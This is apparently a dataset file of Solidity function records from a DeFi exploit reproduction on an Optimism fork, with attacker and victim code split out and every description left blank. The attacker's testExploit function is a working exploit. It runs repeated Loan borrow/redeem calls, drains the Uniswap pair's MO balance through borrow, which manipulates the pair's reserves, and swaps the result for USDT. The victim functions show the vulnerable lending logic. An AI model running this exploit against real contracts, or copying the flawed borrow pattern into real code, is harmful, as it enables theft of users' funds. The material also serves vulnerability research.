[
  {
    "contract/interface": "Money",
    "source_type": "attacker_contract",
    "function_name": "approve",
    "original_code": "    function approve(\n        address a\n    ) public {\n        MO.approve(address(a), type(uint256).max);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "do_some_borrow",
    "original_code": "    function do_some_borrow(\n        uint256 i\n    ) public {\n        LOAN.borrow(mo_balance, 0);\n        LOAN.redeem(i);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"optimism\", 117_395_511);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Begin] Attacker USDT before exploit\", USDT.balanceOf(address(this)), 6);\n        deal(address(MO), address(this), 62_147_724);\n        Money bind_contract = new Money();\n        bind_contract.approve(address(this));\n        // Here can bind some reffer address but can't find the first reffer = =\n        // RELAT.bind(address(bind_contract));\n        MO.approve(address(approve_proxy), type(uint256).max);\n        USDT.approve(address(approve_proxy), type(uint256).max);\n        mo_balance = MO.balanceOf(address(this));\n        // console.log(MO.balanceOf(address(UniV2Pair)));\n        uint256 i = 0;\n        while (i < 80) {\n            try this.do_some_borrow(i) {}\n            catch {\n                break;\n            }\n            i++;\n        }\n        LOAN.borrow(MO.balanceOf(address(UniV2Pair)) - 1, 0);\n        // console.log(MO.balanceOf(address(UniV2Pair)));\n        MO.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(MO);\n        path[1] = address(USDT);\n        // Router.swapExactTokensForTokens(MO.balanceOf(address(this)), 0, path, address(this), block.timestamp + 100);\n        MO.transfer(address(Router), 10); // need some token for pair to send.\n        Router.swapExactTokensForTokens(3, 0, path, address(this), block.timestamp + 100);\n        emit log_named_decimal_uint(\"[End] Attacker USDT after exploit\", USDT.balanceOf(address(this)), 6);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Loan",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "    function borrow(uint256 amount, uint256 duration) public {\n        if (borrowRates[duration] == 0) revert InvalidDuration();\n        if (amount < borrowMinAmount) revert InvalidAmount();\n\n        if (IToken(borrowToken).whitelist(msg.sender) == false) {\n            IToken(borrowToken).setWhitelist(msg.sender, true);\n        }\n        IApproveProxy(approveProxy).claim(borrowToken, msg.sender, address(this), amount);\n\n        uint256 total = (amount * price() * (BASE - borrowOverCollateral)) / BASE / 1e4;\n        IERC20(supplyToken).safeTransfer(msg.sender, total);\n\n        IUniswapV2Pair(pair).setRouter(address(this));\n        IUniswapV2Pair(pair).claim(borrowToken, BURN, (amount * burnRate) / BASE);\n        IUniswapV2Pair(pair).claim(borrowToken, address(this), (amount * (BASE - burnRate)) / BASE);\n        IUniswapV2Pair(pair).sync();\n        IUniswapV2Pair(pair).setRouter(router);\n\n        address referrer = IRelationship(relationship).referrers(msg.sender);\n        if (IPoolV2(poolV2).getOrder(referrer).running == true) {\n            uint256 referralReward = (amount * inviteRewardRate) / BASE;\n            IERC20(borrowToken).safeTransfer(referrer, referralReward);\n            totalReferralRewardOf[referrer] += referralReward;\n            emit ReferralRewardClaimed(referrer, referralReward);\n        }\n\n        rewardPerTokenStored += (amount * (BASE - burnRate - inviteRewardRate) * 1e6 * 1e18) / totalSupply / BASE;\n\n        BorrowOrder memory order = BorrowOrder(\n            amount,\n            total,\n            duration,\n            block.timestamp,\n            block.timestamp + duration * 1 days,\n            borrowRates[duration],\n            false\n        );\n\n        borrowOrders[msg.sender].push(order);\n        borrowOrdersCount[msg.sender]++;\n\n        emit BorrowOrderCreated(\n            msg.sender,\n            order.amount,\n            order.total,\n            order.duration,\n            order.interestRate,\n            borrowOrdersCount[msg.sender] - 1\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Loan",
    "source_type": "victim_contract",
    "function_name": "borrowOrdersCount",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Loan",
    "source_type": "victim_contract",
    "function_name": "redeem",
    "original_code": "    function redeem(uint256 index) public {\n        BorrowOrder storage order = borrowOrders[msg.sender][index];\n        if (order.amount == 0) revert InvalidIndex();\n        if (order.duration != 0 && block.timestamp < order.expiredTime) revert NotExpired();\n        if (order.finished == true) revert Finished();\n\n        uint256 intere = interest(msg.sender, index);\n        uint256 amount = (order.amount * redeemRate) / BASE;\n\n        IApproveProxy(approveProxy).claim(\n            supplyToken,\n            msg.sender,\n            address(this),\n            order.total + intere\n        );\n        IERC20(borrowToken).safeTransfer(msg.sender, amount);\n        order.finished = true;\n\n        emit BorrowOrderFinished(msg.sender, index, amount, intere);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Relation",
    "source_type": "victim_contract",
    "function_name": "bind",
    "original_code": "    function bind(address referrer) public {\n        _bind(msg.sender, referrer);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Relation",
    "source_type": "victim_contract",
    "function_name": "hasBinded",
    "original_code": "    function hasBinded(address user) public view returns (bool) {\n        if (user == ROOT) {\n            return true;\n        }\n        return referrers[user] != address(0);\n    }\n\n",
    "description": ""
  }
]